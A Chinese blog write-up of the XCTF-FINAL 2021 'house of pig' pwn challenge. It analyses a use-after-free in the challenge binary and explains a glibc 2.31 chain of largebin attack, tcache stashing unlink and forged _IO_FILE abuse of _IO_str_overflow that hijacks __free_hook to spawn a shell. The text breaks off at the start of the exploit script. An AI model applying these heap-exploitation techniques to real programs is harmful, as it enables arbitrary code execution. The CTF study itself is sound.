<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>XCTF-FINAL 2021-house of pig-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="感觉自己还是太菜了，在比赛期间甚至都没有逆清楚这道题，即使学长给了分析好的 idb 文件也看不懂。当然当时身体不是很好也有一部分原因，但是还是觉得很"><meta property="og:image" content><meta property="og:title" content="XCTF-FINAL 2021-house of pig-WP"><meta property="og:description" content="感觉自己还是太菜了，在比赛期间甚至都没有逆清楚这道题，即使学长给了分析好的 idb 文件也看不懂。当然当时身体不是很好也有一部分原因，但是还是觉得很"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1362.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-06-01T23:47:00+00:00"><meta property="article:modified_time" content="2021-06-01T23:47:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="XCTF-FINAL 2021-house of pig-WP"><meta name=twitter:description content="感觉自己还是太菜了，在比赛期间甚至都没有逆清楚这道题，即使学长给了分析好的 idb 文件也看不懂。当然当时身体不是很好也有一部分原因，但是还是觉得很"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>XCTF-FINAL 2021-house of pig-WP</h1><div class=meta>Posted on Jun 1, 2021</div></div><section class=body><p>感觉自己还是太菜了，在比赛期间甚至都没有逆清楚这道题，即使学长给了分析好的 idb 文件也看不懂。当然当时身体不是很好也有一部分原因，但是还是觉得很遗憾。比赛结束后复现了一下，也算是学习一下新的利用方法。</p><p>参考自<a href=https://www.anquanke.com/post/id/242640#h2-3>house of pig一个新的堆利用详解</a></p><h3 id=跳表修复>跳表修复</h3><p>拿到题目，直接 F5 的话可能会出现 <code>__asm{ jmp rax }</code> 这样的指令</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/2586093918.png></div><p>这是 switch 的跳表结构未被 IDA 识别造成的，导致了大量代码丢失，解决方案可以参考<a href=https://www.cjovi.icu/mess/1345.html>我的这篇文章</a>，对于此程序应该使用的参数为</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/1088234536.png></div><p>然后就可以识别出 switch 了。</p><h3 id=流程分析>流程分析</h3><p>首先，经过大胆猜测可以分析出每只猪的结构体结构</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>PIG</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>des_ptr[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> des_size[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> des_exist_sign[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> freed_sign[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>和 qword_9070 指向的结构体结构</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>ALL_PIGS</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>peppa_des_ptr[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> peppa_des_size[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> peppa_des_exist_sign[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> peppa_freed_sign[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> peppa_last_size;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> align1;
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>mummy_des_ptr[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> mummy_des_size[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> mummy_des_exist_sign[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> mummy_freed_sign[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> mummy_last_size;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> align2;
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>daddy_des_ptr[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> daddy_des_size[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> daddy_des_exist_sign[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> daddy_freed_sign[<span style=color:#40a070>24</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> daddy_last_size;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> view_times_left;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> edit_times_left;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>把这两个结构体补全后，程序的流程就会容易分析许多，总体的漏洞是在改变猪猪的时候，备份和更新结构体时未对 des_exist_sign[24] 数组更新</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/4157398465.png></div><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/36935588.png></div><p>可见两个函数中都没有对 des_exist_sign[24] 的操作。而在 edit 和 view 函数中，都是通过这个 sign 判断一个 message 是否存在的，所以通过更改角色可以实现 UAF。</p><p>更改角色要通过一个 check_password 的操作，这里对密码的操作我是真的完全不懂，所以直接抄了学长的爆破结果（的确还是有必要了解一点逆行中常见的加密操作的，之后找个时间补一下）。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>change_rol</span>(role):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice: &#34;</span>,<span style=color:#4070a0>&#39;5&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (role <span style=color:#666>==</span> <span style=color:#40a070>1</span>):
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;user:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#34;A</span><span style=color:#4070a0;font-weight:700>\x01\x95\xc9\x1c</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (role <span style=color:#666>==</span> <span style=color:#40a070>2</span>):
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;user:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#34;B</span><span style=color:#4070a0;font-weight:700>\x01\x87\xc3\x19</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (role <span style=color:#666>==</span> <span style=color:#40a070>3</span>):
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;user:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#34;C</span><span style=color:#4070a0;font-weight:700>\x01\xf7\x3c\x32</span><span style=color:#4070a0>&#34;</span>)
</span></span></code></pre></div><p>总结一下，程序主要的漏洞点是有 UAF，可以 show，可以 edit，分别有 2 和 8 次机会。最大可以申请 0x440 大小的空间，即可以使 chunk 进入 unsorted bin 和 large bin。整个程序中不存在 malloc 函数，全部是 calloc，由此函数的不从 tcache 中取出 chunk 的性质，且不可以申请 fastbin 范围中的 chunk，导致利用比较困难。</p><h3 id=利用方法>利用方法</h3><p>首先 libc 版本为 2.31。</p><p>两次 show 的机会可以把堆和 libc 的基地址都 leak 出来，这个比较简单，不多说了。</p><p>然后就比较困难了，因为无法直接通过 tcache 或 fastbin 攻击。官方给出的解法为被称为 house of pig 的利用方法，引用原文</p><blockquote><p>该攻击方式适用于 libc 2.31及以后的新版本 libc，本质上是通过 libc2.31 下的 <code>largebin attack</code>以及 <code>FILE 结构</code>利用，来配合 libc2.31 下的 <code>tcache stashing unlink attack</code> 进行组合利用的方法。主要适用于程序中仅有 <code>calloc 函数</code>来申请 chunk，而没有调用 <code>malloc 函数</code>的情况。</p></blockquote><p>利用条件为</p><ul><li>存在 UAF</li><li>能执行abort流程或程序显式调用 exit 或程序能通过主函数返回。</li></ul><p>主要利用的函数为 _IO_str_overflow。</p><p>利用流程为</p><ol><li>进行一个 Tcache Stash Unlink+ 攻击，把地址 <code>__free_hook - 0x10</code> 写入 tcache_pthread_struct。由于该攻击要求 <code>__free_hook - 0x8</code> 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。</li><li>再进行一个 large bin attack，修改 _IO_list_all 为一个堆地址，然后在该处伪造 _IO_FILE 结构体。</li></ol><h4 id=large-bin-attack>large bin attack</h4><p>我其实没怎么用过这种攻击方法，这里记录一下攻击的原理。</p><p>主要利用的是 chunk 进入 bin 中的操作，在 malloc 的时候，遍历 unsorted bin 时，对每一个 chunk，若无法 exact-fit 分配或不满足切割分配的条件，就会将该 chunk 置入相应的 bin 中，而此过程中缺乏对 largebin 的跳表指针的检测。</p><p>以 2.33 版本的 libc 为例，从 4052 开始就是对 largebin chunk 的入 bin 操作</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>              victim_index <span style=color:#666>=</span> largebin_index (size);
</span></span><span style=display:flex><span>              bck <span style=color:#666>=</span> bin_at (av, victim_index);
</span></span><span style=display:flex><span>              fwd <span style=color:#666>=</span> bck<span style=color:#666>-&gt;</span>fd;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>              <span style=color:#60a0b0;font-style:italic>/* maintain large bins in sorted order */</span>
</span></span><span style=display:flex><span>              <span style=color:#007020;font-weight:700>if</span> (fwd <span style=color:#666>!=</span> bck)
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                  <span style=color:#60a0b0;font-style:italic>/* Or with inuse bit to speed comparisons */</span>
</span></span><span style=display:flex><span>                  size <span style=color:#666>|=</span> PREV_INUSE;
</span></span><span style=display:flex><span>                  <span style=color:#60a0b0;font-style:italic>/* if smaller than smallest, bypass loop below */</span>
</span></span><span style=display:flex><span>                  assert (chunk_main_arena (bck<span style=color:#666>-&gt;</span>bk));
</span></span><span style=display:flex><span>                  <span style=color:#007020;font-weight:700>if</span> ((<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) (size)
</span></span><span style=display:flex><span>		      <span style=color:#666>&lt;</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) chunksize_nomask (bck<span style=color:#666>-&gt;</span>bk))
</span></span><span style=display:flex><span>                    {
</span></span><span style=display:flex><span>                      fwd <span style=color:#666>=</span> bck;
</span></span><span style=display:flex><span>                      bck <span style=color:#666>=</span> bck<span style=color:#666>-&gt;</span>bk;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                      victim<span style=color:#666>-&gt;</span>fd_nextsize <span style=color:#666>=</span> fwd<span style=color:#666>-&gt;</span>fd;
</span></span><span style=display:flex><span>                      victim<span style=color:#666>-&gt;</span>bk_nextsize <span style=color:#666>=</span> fwd<span style=color:#666>-&gt;</span>fd<span style=color:#666>-&gt;</span>bk_nextsize;
</span></span><span style=display:flex><span>                      fwd<span style=color:#666>-&gt;</span>fd<span style=color:#666>-&gt;</span>bk_nextsize <span style=color:#666>=</span> victim<span style=color:#666>-&gt;</span>bk_nextsize<span style=color:#666>-&gt;</span>fd_nextsize <span style=color:#666>=</span> victim;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                  <span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>                    {
</span></span><span style=display:flex><span>                      assert (chunk_main_arena (fwd));
</span></span><span style=display:flex><span>                      <span style=color:#007020;font-weight:700>while</span> ((<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) size <span style=color:#666>&lt;</span> chunksize_nomask (fwd))
</span></span><span style=display:flex><span>                        {
</span></span><span style=display:flex><span>                          fwd <span style=color:#666>=</span> fwd<span style=color:#666>-&gt;</span>fd_nextsize;
</span></span><span style=display:flex><span>			  assert (chunk_main_arena (fwd));
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                      <span style=color:#007020;font-weight:700>if</span> ((<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) size
</span></span><span style=display:flex><span>			  <span style=color:#666>==</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) chunksize_nomask (fwd))
</span></span><span style=display:flex><span>                        <span style=color:#60a0b0;font-style:italic>/* Always insert in the second position.  */</span>
</span></span><span style=display:flex><span>                        fwd <span style=color:#666>=</span> fwd<span style=color:#666>-&gt;</span>fd;
</span></span><span style=display:flex><span>                      <span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>                        {
</span></span><span style=display:flex><span>                          victim<span style=color:#666>-&gt;</span>fd_nextsize <span style=color:#666>=</span> fwd;
</span></span><span style=display:flex><span>                          victim<span style=color:#666>-&gt;</span>bk_nextsize <span style=color:#666>=</span> fwd<span style=color:#666>-&gt;</span>bk_nextsize;
</span></span><span style=display:flex><span>                          <span style=color:#007020;font-weight:700>if</span> (__glibc_unlikely (fwd<span style=color:#666>-&gt;</span>bk_nextsize<span style=color:#666>-&gt;</span>fd_nextsize <span style=color:#666>!=</span> fwd))
</span></span><span style=display:flex><span>                            malloc_printerr (<span style=color:#4070a0>&#34;malloc(): largebin double linked list corrupted (nextsize)&#34;</span>);
</span></span><span style=display:flex><span>                          fwd<span style=color:#666>-&gt;</span>bk_nextsize <span style=color:#666>=</span> victim;
</span></span><span style=display:flex><span>                          victim<span style=color:#666>-&gt;</span>bk_nextsize<span style=color:#666>-&gt;</span>fd_nextsize <span style=color:#666>=</span> victim;
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                      bck <span style=color:#666>=</span> fwd<span style=color:#666>-&gt;</span>bk;
</span></span><span style=display:flex><span>                      <span style=color:#007020;font-weight:700>if</span> (bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>!=</span> fwd)
</span></span><span style=display:flex><span>                        malloc_printerr (<span style=color:#4070a0>&#34;malloc(): largebin double linked list corrupted (bk)&#34;</span>);
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span></code></pre></div><p>在 2.29 及以下的版本中，根据 unsorted chunk 的大小不同</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>fwd<span style=color:#666>-&gt;</span>fd<span style=color:#666>-&gt;</span>bk_nextsize <span style=color:#666>=</span> victim<span style=color:#666>-&gt;</span>bk_nextsize<span style=color:#666>-&gt;</span>fd_nextsize <span style=color:#666>=</span> victim;
</span></span><span style=display:flex><span>victim<span style=color:#666>-&gt;</span>bk_nextsize<span style=color:#666>-&gt;</span>fd_nextsize <span style=color:#666>=</span> victim;
</span></span></code></pre></div><p>在 unsorted chunk 小于链表中最小的 chunk 的时候会执行前一句，反之执行后一句。</p><p>由于两者大小相同的时候只会使用如下的方法插入，所以此时无法利用。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> ((<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) size
</span></span><span style=display:flex><span>			  <span style=color:#666>==</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) chunksize_nomask (fwd))
</span></span><span style=display:flex><span>                        <span style=color:#60a0b0;font-style:italic>/* Always insert in the second position.  */</span>
</span></span><span style=display:flex><span>                        fwd <span style=color:#666>=</span> fwd<span style=color:#666>-&gt;</span>fd;
</span></span></code></pre></div><p>所以有两种利用方法。</p><p>在 2.30 版本新加入了对 largebin 跳表的完整性检查，使 unsorted chunk 大于链表中最小的 chunk 时的利用失效，必须使 unsorted chunk 小于链表中最小的 chunk，通过</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>victim<span style=color:#666>-&gt;</span>bk_nextsize<span style=color:#666>-&gt;</span>fd_nextsize <span style=color:#666>=</span> victim;
</span></span></code></pre></div><p>实现利用，也就是将本 chunk 的地址写到 <code>bk_nextsize + 0x20</code> 处。</p><p>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击，并可以修改 _IO_list_all 便于伪造结构体。</p><h4 id=_io_str_overflow-利用>_IO_str_overflow 利用</h4><p>这是我第一次碰到对这个函数的利用，由于在 libc 2.24 之后增加了对 vtable 位置合法性的检查，所以劫持 _IO_jump_t 的方法失效，但是跳表 _IO_str_jumps 是在 check 范围内的，也就是我们可以将 _IO_jump_t 劫持为 _IO_str_jumps，这样是可以通过合法性检查的，然后本该调用 _IO_overflow 的时候就会变成调用 _IO_str_overflow，此函数的实现如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span>
</span></span><span style=display:flex><span><span style=color:#06287e>_IO_str_overflow</span> (FILE <span style=color:#666>*</span>fp, <span style=color:#902000>int</span> c)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> flush_only <span style=color:#666>=</span> c <span style=color:#666>==</span> EOF;
</span></span><span style=display:flex><span>  size_t pos;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>&amp;</span> _IO_NO_WRITES)
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>return</span> flush_only <span style=color:#666>?</span> <span style=color:#40a070>0</span> <span style=color:#666>:</span> EOF;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ((fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>&amp;</span> _IO_TIED_PUT_GET) <span style=color:#666>&amp;&amp;</span> <span style=color:#666>!</span>(fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>&amp;</span> _IO_CURRENTLY_PUTTING))
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>|=</span> _IO_CURRENTLY_PUTTING;
</span></span><span style=display:flex><span>      fp<span style=color:#666>-&gt;</span>_IO_write_ptr <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_read_ptr;
</span></span><span style=display:flex><span>      fp<span style=color:#666>-&gt;</span>_IO_read_ptr <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_read_end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  pos <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_write_ptr <span style=color:#666>-</span> fp<span style=color:#666>-&gt;</span>_IO_write_base;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (pos <span style=color:#666>&gt;=</span> (size_t) (_IO_blen (fp) <span style=color:#666>+</span> flush_only))
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>&amp;</span> _IO_USER_BUF) <span style=color:#60a0b0;font-style:italic>/* not allowed to enlarge */</span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> EOF;
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          <span style=color:#902000>char</span> <span style=color:#666>*</span>new_buf;
</span></span><span style=display:flex><span>          <span style=color:#902000>char</span> <span style=color:#666>*</span>old_buf <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_buf_base;
</span></span><span style=display:flex><span>          size_t old_blen <span style=color:#666>=</span> _IO_blen (fp);
</span></span><span style=display:flex><span>          size_t new_size <span style=color:#666>=</span> <span style=color:#40a070>2</span> <span style=color:#666>*</span> old_blen <span style=color:#666>+</span> <span style=color:#40a070>100</span>;
</span></span><span style=display:flex><span>          <span style=color:#007020;font-weight:700>if</span> (new_size <span style=color:#666>&lt;</span> old_blen)
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>return</span> EOF;
</span></span><span style=display:flex><span>          new_buf <span style=color:#666>=</span> malloc (new_size);
</span></span><span style=display:flex><span>          <span style=color:#007020;font-weight:700>if</span> (new_buf <span style=color:#666>==</span> <span style=color:#007020>NULL</span>)
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>              <span style=color:#60a0b0;font-style:italic>/*          __ferror(fp) = 1; */</span>
</span></span><span style=display:flex><span>              <span style=color:#007020;font-weight:700>return</span> EOF;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>          <span style=color:#007020;font-weight:700>if</span> (old_buf)
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>              memcpy (new_buf, old_buf, old_blen);
</span></span><span style=display:flex><span>              free (old_buf);
</span></span><span style=display:flex><span>              <span style=color:#60a0b0;font-style:italic>/* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */</span>
</span></span><span style=display:flex><span>              fp<span style=color:#666>-&gt;</span>_IO_buf_base <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>          memset (new_buf <span style=color:#666>+</span> old_blen, <span style=color:#4070a0>&#39;\0&#39;</span>, new_size <span style=color:#666>-</span> old_blen);
</span></span><span style=display:flex><span>          _IO_setb (fp, new_buf, new_buf <span style=color:#666>+</span> new_size, <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>          fp<span style=color:#666>-&gt;</span>_IO_read_base <span style=color:#666>=</span> new_buf <span style=color:#666>+</span> (fp<span style=color:#666>-&gt;</span>_IO_read_base <span style=color:#666>-</span> old_buf);
</span></span><span style=display:flex><span>          fp<span style=color:#666>-&gt;</span>_IO_read_ptr <span style=color:#666>=</span> new_buf <span style=color:#666>+</span> (fp<span style=color:#666>-&gt;</span>_IO_read_ptr <span style=color:#666>-</span> old_buf);
</span></span><span style=display:flex><span>          fp<span style=color:#666>-&gt;</span>_IO_read_end <span style=color:#666>=</span> new_buf <span style=color:#666>+</span> (fp<span style=color:#666>-&gt;</span>_IO_read_end <span style=color:#666>-</span> old_buf);
</span></span><span style=display:flex><span>          fp<span style=color:#666>-&gt;</span>_IO_write_ptr <span style=color:#666>=</span> new_buf <span style=color:#666>+</span> (fp<span style=color:#666>-&gt;</span>_IO_write_ptr <span style=color:#666>-</span> old_buf);
</span></span><span style=display:flex><span>          fp<span style=color:#666>-&gt;</span>_IO_write_base <span style=color:#666>=</span> new_buf;
</span></span><span style=display:flex><span>          fp<span style=color:#666>-&gt;</span>_IO_write_end <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_buf_end;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>flush_only)
</span></span><span style=display:flex><span>    <span style=color:#666>*</span>fp<span style=color:#666>-&gt;</span>_IO_write_ptr<span style=color:#666>++</span> <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span>) c;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (fp<span style=color:#666>-&gt;</span>_IO_write_ptr <span style=color:#666>&gt;</span> fp<span style=color:#666>-&gt;</span>_IO_read_end)
</span></span><span style=display:flex><span>    fp<span style=color:#666>-&gt;</span>_IO_read_end <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_write_ptr;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> c;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>libc_hidden_def (_IO_str_overflow)
</span></span></code></pre></div><p>注意到满足</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>pos <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_write_ptr <span style=color:#666>-</span> fp<span style=color:#666>-&gt;</span>_IO_write_base;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (pos <span style=color:#666>&gt;=</span> (size_t) (_IO_blen (fp) <span style=color:#666>+</span> flush_only))
</span></span></code></pre></div><p>的时候，会先后执行</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>size_t old_blen <span style=color:#666>=</span> _IO_blen (fp);
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// #define _IO_blen (fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>new_buf <span style=color:#666>=</span> malloc (new_size);
</span></span><span style=display:flex><span>memcpy (new_buf, old_buf, old_blen);
</span></span><span style=display:flex><span>free (old_buf);
</span></span></code></pre></div><p>三个操作，伪造 _IO_FILE 并劫持 vtable 为 _IO_str_jumps 通过一个 large bin attack 就可以轻松实现，并且我们上面三个语句中的 new_size，old_buf 和 old_blen 是我们可控的，这个函数就可以实现以下三步</p><ol><li>调用 malloc，实现从 tcache 中分配 chunk，在这里就可以把我们之前放入的 __free_hook fake chunk 申请出来</li><li>将一段可控长度可控内容的内存段拷贝置 malloc 得来的 chunk 中（可以修改 __free_hook 为 system）</li><li>调用 free，且参数为内存段起始地址（"/bin/sh\x00"，getshell）</li></ol><p>也就是只要我们构造得当，执行该函数即可 getshell。</p><h3 id=exp>exp</h3><p>exp 可能写的比较烂，改来改去也是十分痛苦。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>,<span style=color:#4070a0>&#34;splitw&#34;</span>,<span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add_message</span>(size,payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice: &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
